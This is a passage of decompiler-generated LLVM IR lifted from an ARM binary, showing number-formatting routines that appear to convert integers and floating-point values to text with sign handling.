  br label %dec_label_pc_11aa0

dec_label_pc_11aa0:                               ; preds = %dec_label_pc_11aa0thread-pre-split, %.thread
  %v0_11b10 = phi i32 [ %v0_11aa8.pre, %dec_label_pc_11aa0thread-pre-split ], [ %v1_11a8c, %.thread ]
  %v0_11aa4 = phi i32 [ %v0_11aa0.pr, %dec_label_pc_11aa0thread-pre-split ], [ %v0_11a98, %.thread ]
  %v2_11aa0 = icmp eq i32 %v0_11aa4, 0
  store i1 %v2_11aa0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11aa0, label %dec_label_pc_11b0c, label %dec_label_pc_11ab0

dec_label_pc_11ab0:                               ; preds = %dec_label_pc_11aa0
  %v2_11ab0 = call i32 @function_ca30(i32 %v0_11aa4, i32 %v0_11b10)
  %v0_11ab4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_11ab4, i32* @r1, align 4
  store i32 %v2_11ab0, i32* %r4.global-to-local, align 4
  %v0_11abc = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_11abc, i32* @r0, align 4
  %v0_11ac0 = call i32 @function_14f20()
  store i32 %v0_11ac0, i32* %sl.global-to-local, align 4
  %v0_11acc = load i32, i32* %r6.global-to-local, align 4
  %v2_11ad0 = call i32 @function_ca30(i32 %v0_11acc, i32 %v0_11ab4)
  %v0_11ad4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_11ad4, i32* @r1, align 4
  %v0_11ad8 = load i32, i32* %r4.global-to-local, align 4
  %v1_11ad8 = load i32, i32* %sb.global-to-local, align 4
  %v3_11ad8 = mul i32 %v1_11ad8, %v0_11ad8
  %v4_11ad8 = add i32 %v3_11ad8, %v2_11ad0
  store i32 %v4_11ad8, i32* %r5.global-to-local, align 4
  %v0_11adc = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_11adc, i32* @r0, align 4
  %v0_11ae0 = call i32 @function_14f20()
  %v0_11ae4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_11ae4, i32* @r1, align 4
  %v0_11ae8 = load i32, i32* %fp.global-to-local, align 4
  %v1_11ae8 = load i32, i32* %r4.global-to-local, align 4
  %v3_11ae8 = mul i32 %v1_11ae8, %v0_11ae8
  %v4_11ae8 = add i32 %v3_11ae8, %v0_11ae0
  store i32 %v4_11ae8, i32* %r4.global-to-local, align 4
  %v0_11aec = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_11aec, i32* @r0, align 4
  %v0_11af0 = call i32 @function_14f20()
  %v0_11af4 = load i32, i32* %r7.global-to-local, align 4
  %v2_11af8 = add i32 %v4_11ae8, %v0_11af0
  store i32 %v2_11af8, i32* %r6.global-to-local, align 4
  %v2_11b00 = call i32 @function_ca30(i32 %v0_11aec, i32 %v0_11af4)
  store i32 %v2_11b00, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11b2c

dec_label_pc_11b0c:                               ; preds = %dec_label_pc_11aa0
  %v0_11b0c = load i32, i32* %r6.global-to-local, align 4
  %v2_11b14 = call i32 @function_ca30(i32 %v0_11b0c, i32 %v0_11b10)
  %v0_11b18 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_11b18, i32* @r1, align 4
  store i32 %v2_11b14, i32* %r4.global-to-local, align 4
  store i32 %v0_11b0c, i32* @r0, align 4
  %v0_11b24 = call i32 @function_14f20()
  store i32 %v0_11b24, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11b2c

dec_label_pc_11b2c:                               ; preds = %dec_label_pc_11ab0, %dec_label_pc_11b0c
  %v0_11b34 = phi i32 [ %v2_11b00, %dec_label_pc_11ab0 ], [ %v2_11b14, %dec_label_pc_11b0c ]
  %v3_11b2c = load i32, i32* %stack_var_0, align 4
  %v2_11b30 = icmp ugt i32 %v0_11b34, 8
  %v7_11b30 = icmp eq i32 %v0_11b34, 9
  store i1 %v7_11b30, i1* %cpsr_z.global-to-local, align 1
  %v1_11b38 = add i32 %v0_11b34, 48
  %v0_11b40 = load i32, i32* %r8.global-to-local, align 4
  %v1_11b40 = add i32 %v0_11b40, -1
  store i32 %v1_11b40, i32* %r8.global-to-local, align 4
  %v2_11b44 = xor i1 %v7_11b30, true
  %v3_11b44 = and i1 %v2_11b30, %v2_11b44
  %extract.t = trunc i32 %v1_11b38 to i8
  br i1 %v3_11b44, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_11b2c
  %v2_11b34 = add i32 %v3_11b2c, %v0_11b34
  %extract.t6 = trunc i32 %v2_11b34 to i8
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_11b2c, %bb18
  %v0_11b4c.off0 = phi i8 [ %extract.t, %dec_label_pc_11b2c ], [ %extract.t6, %bb18 ]
  %v0_11b48 = load i32, i32* %r6.global-to-local, align 4
  %v1_11b48 = load i32, i32* %sl.global-to-local, align 4
  %v2_11b48 = or i32 %v1_11b48, %v0_11b48
  %v4_11b48 = icmp eq i32 %v2_11b48, 0
  store i1 %v4_11b48, i1* %cpsr_z.global-to-local, align 1
  %v3_11b4c = inttoptr i32 %v1_11b40 to i8*
  store i8 %v0_11b4c.off0, i8* %v3_11b4c, align 1
  %v0_11b50 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11b50, label %dec_label_pc_11b54, label %dec_label_pc_11aa0thread-pre-split

dec_label_pc_11b54:                               ; preds = %bb19
  %v2_11b54 = load i8, i8* %stack_var_-40, align 1
  %v2_11b58 = icmp eq i8 %v2_11b54, 0
  store i1 %v2_11b58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11b58, label %dec_label_pc_11b54..thread2_crit_edge, label %bb20

dec_label_pc_11b54..thread2_crit_edge:            ; preds = %dec_label_pc_11b54
  %v0_11b64.pre = load i32, i32* %r8.global-to-local, align 4
  br label %.thread2

bb20:                                             ; preds = %dec_label_pc_11b54
  %v3_11b60 = load i32, i32* %r8.global-to-local, align 4
  %v4_11b60 = add i32 %v3_11b60, -1
  %v5_11b60 = inttoptr i32 %v4_11b60 to i8*
  store i8 45, i8* %v5_11b60, align 1
  %v6_11b60 = load i32, i32* %r8.global-to-local, align 4
  %v7_11b60 = add i32 %v6_11b60, -1
  store i32 %v7_11b60, i32* %r8.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_11b54..thread2_crit_edge, %bb20
  %v0_11b64 = phi i32 [ %v0_11b64.pre, %dec_label_pc_11b54..thread2_crit_edge ], [ %v7_11b60, %bb20 ]
  ret i32 %v0_11b64

; uselistorder directives
  uselistorder i8* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 2, 0, 3, 1, 4, 5, 6 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 4, 5, 6, 1, 7, 8, 0, 9 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 5, 2, 3, 4, 6, 8, 7, 9 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 %arg3, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_11b2c, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_11a64, { 1, 0 }
}

define i32 @function_11b70(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_11b70:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-42 = alloca i8, align 1
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-43 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-38 = alloca i32, align 4
  %stack_var_-78 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-79 = alloca i32, align 4
  %stack_var_-77 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_11b70 = load i32, i32* @r4, align 4
  store i32 %v3_11b70, i32* %stack_var_-36, align 4
  %v6_11b70 = load i32, i32* @r5, align 4
  %v9_11b70 = load i32, i32* @r6, align 4
  %v12_11b70 = load i32, i32* @r7, align 4
  %v15_11b70 = load i32, i32* @r8, align 4
  %v18_11b70 = load i32, i32* @sb, align 4
  %v21_11b70 = load i32, i32* @sl, align 4
  %v1_11b74 = add i32 %tmp, 8
  %v2_11b74 = inttoptr i32 %v1_11b74 to i8*
  %v3_11b74 = load i8, i8* %v2_11b74, align 1
  %v4_11b74 = zext i8 %v3_11b74 to i32
  store i32 %v4_11b74, i32* @sl, align 4
  store i32 %tmp, i32* %stack_var_-200, align 4
  %v1_11b80 = or i32 %v4_11b74, 32
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_11b84 = icmp ult i32 %v1_11b80, 97
  store i1 %v6_11b84, i1* %cpsr_n.global-to-local, align 1
  %v7_11b84 = icmp eq i32 %v1_11b80, 97
  store i1 %v7_11b84, i1* %cpsr_z.global-to-local, align 1
  store i32 101, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_11b98 = load i32, i32* %arg4, align 4
  store i32 %v2_11b98, i32* %r1.global-to-local, align 4
  br i1 %v7_11b84, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11b70
  %v2_11b9c = add nuw nsw i32 %v4_11b74, 6
  store i32 %v2_11b9c, i32* %r3.global-to-local, align 4
  %v2_11ba4 = urem i32 %v2_11b9c, 256
  store i32 %v2_11ba4, i32* @sl, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11b70, %bb
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %v2_11b98, i32* %ip.global-to-local, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* @r7, align 4
  %v1_11bbc = add i32 %tmp, 12
  %v2_11bbc = inttoptr i32 %v1_11bbc to i32*
  %v3_11bbc = load i32, i32* %v2_11bbc, align 4
  store i32 %v3_11bbc, i32* %r2.global-to-local, align 4
  %v1_11bc0 = add i32 %tmp, 4
  %v2_11bc0 = inttoptr i32 %v1_11bc0 to i32*
  %v3_11bc0 = load i32, i32* %v2_11bc0, align 4
  store i32 %v3_11bc0, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11bc4 = icmp slt i32 %v2_11b98, 0
  store i1 %v1_11bc4, i1* %cpsr_n.global-to-local, align 1
  %v2_11bc4 = icmp eq i32 %v2_11b98, 0
  store i1 %v2_11bc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_11bc4, label %bb221, label %bb222

bb221:                                            ; preds = %.thread
  store i32 6, i32* %ip.global-to-local, align 4
  br label %bb222

bb222:                                            ; preds = %.thread, %bb221
  %v1_11f24 = phi i32 [ %v2_11b98, %.thread ], [ 6, %bb221 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_11bd0 = and i32 %v3_11bbc, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_11bd0 = icmp eq i32 %v1_11bd0, 0
  store i1 %v2_11bd0, i1* %cpsr_z.global-to-local, align 1
  store i8 0, i8* %stack_var_-42, align 1
  br i1 %v2_11bd0, label %dec_label_pc_11be8, label %dec_label_pc_11bf4

dec_label_pc_11be8:                               ; preds = %bb222
  %v1_11be8 = urem i32 %v3_11bbc, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_11be8 = icmp eq i32 %v1_11be8, 0
  store i1 %v2_11be8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11be8, label %dec_label_pc_11bf8, label %dec_label_pc_11bf4

dec_label_pc_11bf4:                               ; preds = %dec_label_pc_11be8, %bb222
  %storemerge = phi i32 [ 43, %bb222 ], [ 32, %dec_label_pc_11be8 ]
  %v0_11bf4.off0 = phi i8 [ 43, %bb222 ], [ 32, %dec_label_pc_11be8 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  store i8 %v0_11bf4.off0, i8* %stack_var_-42, align 1
  br label %dec_label_pc_11bf8

dec_label_pc_11bf8:                               ; preds = %dec_label_pc_11be8, %dec_label_pc_11bf4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r0, align 4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v0_11c14 = call i32 @function_15aac()
  store i32 %v0_11c14, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11c18 = icmp slt i32 %v0_11c14, 0
  store i1 %v1_11c18, i1* %cpsr_n.global-to-local, align 1
  %v2_11c18 = icmp eq i32 %v0_11c14, 0
  store i1 %v2_11c18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11c18, label %dec_label_pc_11c28, label %bb224

bb224:                                            ; preds = %dec_label_pc_11bf8
  store i32 8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11cdc

dec_label_pc_11c28:                               ; preds = %dec_label_pc_11bf8
  %v0_11c28 = load i32, i32* @r6, align 4
  store i32 %v0_11c28, i32* @r0, align 4
  %v0_11c2c = load i32, i32* @r7, align 4
  store i32 %v0_11c2c, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_11c38 = call i32 @function_15aac()
  store i32 %v0_11c38, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11c3c = icmp slt i32 %v0_11c38, 0
  store i1 %v1_11c3c, i1* %cpsr_n.global-to-local, align 1
  %v2_11c3c = icmp eq i32 %v0_11c38, 0
  store i1 %v2_11c3c, i1* %cpsr_z.global-to-local, align 1
  %v0_11c44 = load i32, i32* @r6, align 4
  br i1 %v2_11c3c, label %dec_label_pc_11c44, label %dec_label_pc_11c84

dec_label_pc_11c44:                               ; preds = %dec_label_pc_11c28
  store i32 %v0_11c44, i32* %r2.global-to-local, align 4
  %v0_11c48 = load i32, i32* @r7, align 4
  store i32 %v0_11c48, i32* %r3.global-to-local, align 4
  store i32 1072693248, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v4_11c54 = call i32 @function_15898(i32 1072693248, i32 0, i32 %v0_11c44, i32 %v0_11c48)
  store i32 %v4_11c54, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v1_11c60 = call i32 @function_15aa4(i32 %v4_11c54)
  store i32 %v1_11c60, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11c64 = icmp slt i32 %v1_11c60, 0
  store i1 %v1_11c64, i1* %cpsr_n.global-to-local, align 1
  %v2_11c64 = icmp eq i32 %v1_11c60, 0
  store i1 %v2_11c64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_11c64, label %bb226, label %bb225

bb225:                                            ; preds = %dec_label_pc_11c44
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11e4c

bb226:                                            ; preds = %dec_label_pc_11c44
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 45, i32* %r3.global-to-local, align 4
  store i8 45, i8* %stack_var_-42, align 1
  br label %dec_label_pc_11e4c

dec_label_pc_11c84:                               ; preds = %dec_label_pc_11c28
  store i32 %v0_11c44, i32* @r0, align 4
  %v0_11c88 = load i32, i32* @r7, align 4
  store i32 %v0_11c88, i32* @r1, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v4_11c94 = call i32 @function_15aa4(i32 %v0_11c44)
  store i32 %v4_11c94, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11c98 = icmp slt i32 %v4_11c94, 0
  store i1 %v1_11c98, i1* %cpsr_n.global-to-local, align 1
  %v2_11c98 = icmp eq i32 %v4_11c94, 0
  store i1 %v2_11c98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_11c98, label %bb227, label %._crit_edge

._crit_edge:                                      ; preds = %dec_label_pc_11c84
  %v0_11cb4.pre = load i32, i32* @r6, align 4
  br label %bb228

bb227:                                            ; preds = %dec_label_pc_11c84
  store i32 45, i32* %r2.global-to-local, align 4
  %v3_11ca0 = load i32, i32* @r6, align 4
  %v4_11ca0 = sub i32 0, %v3_11ca0
  store i32 %v4_11ca0, i32* %r3.global-to-local, align 4
  store i8 45, i8* %stack_var_-42, align 1
  store i32 %v4_11ca0, i32* @r6, align 4
  br label %bb228

bb228:                                            ; preds = %._crit_edge, %bb227
  %v0_11cb4 = phi i32 [ %v0_11cb4.pre, %._crit_edge ], [ %v4_11ca0, %bb227 ]
  store i32 1070596096, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v0_11cb4, i32* %r0.global-to-local, align 4
  %v0_11cb8 = load i32, i32* @r7, align 4
  store i32 %v0_11cb8, i32* %r1.global-to-local, align 4
  %v4_11cbc = call i32 @function_15570(i32 %v0_11cb4, i32 %v0_11cb8, i32 1070596096, i32 0)
  store i32 %v4_11cbc, i32* %r2.global-to-local, align 4
  store i32 %v0_11cb8, i32* %r3.global-to-local, align 4
  %v0_11cc8 = load i32, i32* @r6, align 4
  store i32 %v0_11cc8, i32* @r0, align 4
  %v0_11ccc = load i32, i32* @r7, align 4
  store i32 %v0_11ccc, i32* %r1.global-to-local, align 4
  %v0_11cd0 = call i32 @function_15aac()
  store i32 %v0_11cd0, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11cd4 = icmp slt i32 %v0_11cd0, 0
  store i1 %v1_11cd4, i1* %cpsr_n.global-to-local, align 1
  %v2_11cd4 = icmp eq i32 %v0_11cd0, 0
  store i1 %v2_11cd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11cd4, label %dec_label_pc_11cdc, label %dec_label_pc_11d20

dec_label_pc_11cdc:                               ; preds = %bb224, %bb228
  %v0_11c0c.v1_11c208 = phi i32 [ 0, %bb228 ], [ 8, %bb224 ]
  %v2_11cdc = load i32, i32* %stack_var_-200, align 4
  store i32 %v2_11cdc, i32* %ip.global-to-local, align 4
  %v2_11ce4 = add i32 %v2_11cdc, 16
  %v3_11ce4 = inttoptr i32 %v2_11ce4 to i32*
  store i32 32, i32* %v3_11ce4, align 4
  %v0_11cec = load i32, i32* @sl, align 4
  %v1_11cec = add i32 %v0_11cec, -96
  %v3_11cec = sub i32 95, %v0_11cec
  %v4_11cec = and i32 %v3_11cec, %v0_11cec
  %v5_11cec = icmp slt i32 %v4_11cec, 0
  store i1 %v5_11cec, i1* %cpsr_v.global-to-local, align 1
  %v6_11cec = icmp slt i32 %v1_11cec, 0
  store i1 %v6_11cec, i1* %cpsr_n.global-to-local, align 1
  %v7_11cec = icmp eq i32 %v0_11cec, 96
  store i1 %v7_11cec, i1* %cpsr_z.global-to-local, align 1
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 3, i32* %stack_var_-160, align 4
  %tmp287 = icmp ult i32 %v0_11cec, 97
  br i1 %tmp287, label %bb229, label %.thread121

bb229:                                            ; preds = %dec_label_pc_11cdc
  %v5_11d00 = or i32 %v0_11c0c.v1_11c208, 4
  store i32 %v5_11d00, i32* %r3.global-to-local, align 4
  br label %.thread121

.thread121:                                       ; preds = %dec_label_pc_11cdc, %bb229
  %v4_11d04 = phi i32 [ %v5_11d00, %bb229 ], [ 3, %dec_label_pc_11cdc ]
  %v4_11d04.v0_11c0c.v1_11c20 = select i1 %tmp287, i32 %v4_11d04, i32 %v0_11c0c.v1_11c208
  store i32 ptrtoint ([4 x i8]* @global_var_180cc.548 to i32), i32* %r2.global-to-local, align 4
  %v2_11d10 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_11d10, i32* %r6.global-to-local, align 4
  %v2_11d14 = add i32 %v4_11d04.v0_11c0c.v1_11c20, ptrtoint ([4 x i8]* @global_var_180cc.548 to i32)
  store i32 %v2_11d14, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_12258

dec_label_pc_11d20:                               ; preds = %bb228
  store i32 8, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v0_11d30 = load i32, i32* @r6, align 4
  store i32 %v0_11d30, i32* @r4, align 4
  %v0_11d34 = load i32, i32* @r7, align 4
  store i32 %v0_11d34, i32* @r5, align 4
  store i32 256, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_11d3c

dec_label_pc_11d3c:                               ; preds = %dec_label_pc_11df0.dec_label_pc_11d3c_crit_edge, %dec_label_pc_11d20
  %v0_11d48 = phi i32 [ %v0_11d30, %dec_label_pc_11d20 ], [ %v0_11d48.pre, %dec_label_pc_11df0.dec_label_pc_11d3c_crit_edge ]
  %v0_11d3c = phi i32 [ %v0_11d34, %dec_label_pc_11d20 ], [ %v0_11d3c.pre, %dec_label_pc_11df0.dec_label_pc_11d3c_crit_edge ]
  %stack_var_-180.0 = phi i32 [ 9, %dec_label_pc_11d20 ], [ %v1_11d54, %dec_label_pc_11df0.dec_label_pc_11d3c_crit_edge ]
  %stack_var_-192.2 = phi i32 [ 8, %dec_label_pc_11d20 ], [ %stack_var_-192.5, %dec_label_pc_11df0.dec_label_pc_11d3c_crit_edge ]
  store i32 %v0_11d3c, i32* @r1, align 4
  store i32 1100470148, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  store i32 %v0_11d48, i32* @r0, align 4
  %v4_11d4c = call i32 @function_15aa4(i32 %v0_11d48)
  %v1_11d54 = add i32 %stack_var_-180.0, -1
  store i32 ptrtoint (i32* @global_var_180e0.551 to i32), i32* %r2.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11d64 = icmp slt i32 %v4_11d4c, 0
  store i1 %v1_11d64, i1* %cpsr_n.global-to-local, align 1
  %v2_11d64 = icmp eq i32 %v4_11d4c, 0
  store i1 %v2_11d64, i1* %cpsr_z.global-to-local, align 1
  %v3_11d68 = mul i32 %v1_11d54, 8
  store i32 %v3_11d68, i32* %r3.global-to-local, align 4
  %v0_11d6c = load i32, i32* @r4, align 4
  store i32 %v0_11d6c, i32* %r0.global-to-local, align 4
  %v0_11d70 = load i32, i32* @r5, align 4
  store i32 %v0_11d70, i32* %r1.global-to-local, align 4
  %v2_11d74 = add i32 %v3_11d68, ptrtoint (i32* @global_var_180e0.551 to i32)
  store i32 %v2_11d74, i32* %ip.global-to-local, align 4
  %v1_11d7c = inttoptr i32 %v2_11d74 to i32*
  %v2_11d7c = load i32, i32* %v1_11d7c, align 4
  store i32 %v2_11d7c, i32* %r2.global-to-local, align 4
  %v3_11d7c = add i32 %v3_11d68, add (i32 ptrtoint (i32* @global_var_180e0.551 to i32), i32 4)
  %v4_11d7c = inttoptr i32 %v3_11d7c to i32*
  %v5_11d7c = load i32, i32* %v4_11d7c, align 4
  store i32 %v5_11d7c, i32* %r3.global-to-local, align 4
  br i1 %v1_11d64, label %dec_label_pc_11d7c, label %dec_label_pc_11db0

dec_label_pc_11d7c:                               ; preds = %dec_label_pc_11d3c
  %v5_11d80 = call i32 @function_15570(i32 %v0_11d6c, i32 %v0_11d70, i32 %v2_11d7c, i32 %v5_11d7c)
  store i32 %v5_11d80, i32* @r0, align 4
  store i32 1104006501, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  store i32 %v5_11d80, i32* @r8, align 4
  store i32 %v0_11d70, i32* @sb, align 4
  %v1_11d94 = call i32 @function_15aa4(i32 %v5_11d80)
  store i32 %v1_11d94, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11d98 = icmp slt i32 %v1_11d94, 0
  store i1 %v1_11d98, i1* %cpsr_n.global-to-local, align 1
  %v2_11d98 = icmp eq i32 %v1_11d94, 0
  store i1 %v2_11d98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_11d98, label %.thread124, label %dec_label_pc_11df0

.thread124:                                       ; preds = %dec_label_pc_11d7c
  %v3_11da0 = load i32, i32* %fp.global-to-local, align 4
  %v5_11da0 = sub i32 %stack_var_-192.2, %v3_11da0
  store i32 %v5_11da0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11de8

dec_label_pc_11db0:                               ; preds = %dec_label_pc_11d3c
  store i32 %v0_11d6c, i32* %r0.global-to-local, align 4
  store i32 %v0_11d70, i32* %r1.global-to-local, align 4
  %v5_11dbc = call i32 @function_15898(i32 %v0_11d6c, i32 %v0_11d70, i32 %v2_11d7c, i32 %v5_11d7c)
  store i32 %v5_11dbc, i32* @r0, align 4
  store i32 1100470148, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  store i32 %v5_11dbc, i32* @r8, align 4
  store i32 %v0_11d70, i32* @sb, align 4
  %v4_11dd0 = call i32 @function_15a9c(i32 %v5_11dbc, i32 %v0_11d70, i32 1100470148, i32 0)
  store i32 %v4_11dd0, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11dd4 = icmp slt i32 %v4_11dd0, 0
  store i1 %v1_11dd4, i1* %cpsr_n.global-to-local, align 1
  %v2_11dd4 = icmp eq i32 %v4_11dd0, 0
  store i1 %v2_11dd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_11dd4, label %dec_label_pc_11df0, label %dec_label_pc_11ddc

dec_label_pc_11ddc:                               ; preds = %dec_label_pc_11db0
  %v1_11de0 = load i32, i32* %fp.global-to-local, align 4
  %v2_11de0 = add i32 %v1_11de0, %stack_var_-192.2
  store i32 %v2_11de0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11de8

dec_label_pc_11de8:                               ; preds = %.thread124, %dec_label_pc_11ddc
  %stack_var_-192.4 = phi i32 [ %v2_11de0, %dec_label_pc_11ddc ], [ %v5_11da0, %.thread124 ]
  %v0_11de8 = load i32, i32* @r8, align 4
  store i32 %v0_11de8, i32* @r4, align 4
  %v0_11dec = load i32, i32* @sb, align 4
  store i32 %v0_11dec, i32* @r5, align 4
  br label %dec_label_pc_11df0

dec_label_pc_11df0:                               ; preds = %dec_label_pc_11d7c, %dec_label_pc_11db0, %dec_label_pc_11de8
  %stack_var_-192.5 = phi i32 [ %stack_var_-192.4, %dec_label_pc_11de8 ], [ %stack_var_-192.2, %dec_label_pc_11db0 ], [ %stack_var_-192.2, %dec_label_pc_11d7c ]
  store i32 %v1_11d54, i32* %r2.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11df4 = icmp slt i32 %v1_11d54, 0
  store i1 %v1_11df4, i1* %cpsr_n.global-to-local, align 1
  %v2_11df4 = icmp eq i32 %v1_11d54, 0
  store i1 %v2_11df4, i1* %cpsr_z.global-to-local, align 1
  %v0_11df8 = load i32, i32* %fp.global-to-local, align 4
  %v3_11df8 = sdiv i32 %v0_11df8, 2
  store i32 %v3_11df8, i32* %fp.global-to-local, align 4
  br i1 %v2_11df4, label %dec_label_pc_11e00, label %dec_label_pc_11df0.dec_label_pc_11d3c_crit_edge

dec_label_pc_11df0.dec_label_pc_11d3c_crit_edge:  ; preds = %dec_label_pc_11df0
  %v0_11d3c.pre = load i32, i32* @r7, align 4
  %v0_11d48.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_11d3c

dec_label_pc_11e00:                               ; preds = %dec_label_pc_11df0
  %v0_11e00 = load i32, i32* @r4, align 4
  store i32 %v0_11e00, i32* @r0, align 4
  %v0_11e04 = load i32, i32* @r5, align 4
  store i32 %v0_11e04, i32* @r1, align 4
  store i32 1104006501, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v4_11e10 = call i32 @function_15a9c(i32 %v0_11e00, i32 %v0_11e04, i32 1104006501, i32 0)
  store i32 %v4_11e10, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11e14 = icmp slt i32 %v4_11e10, 0
  store i1 %v1_11e14, i1* %cpsr_n.global-to-local, align 1
  %v2_11e14 = icmp eq i32 %v4_11e10, 0
  store i1 %v2_11e14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_11e14, label %.thread126, label %dec_label_pc_11e24

.thread126:                                       ; preds = %dec_label_pc_11e00
  %v3_11e18 = load i32, i32* @r4, align 4
  store i32 %v3_11e18, i32* @r6, align 4
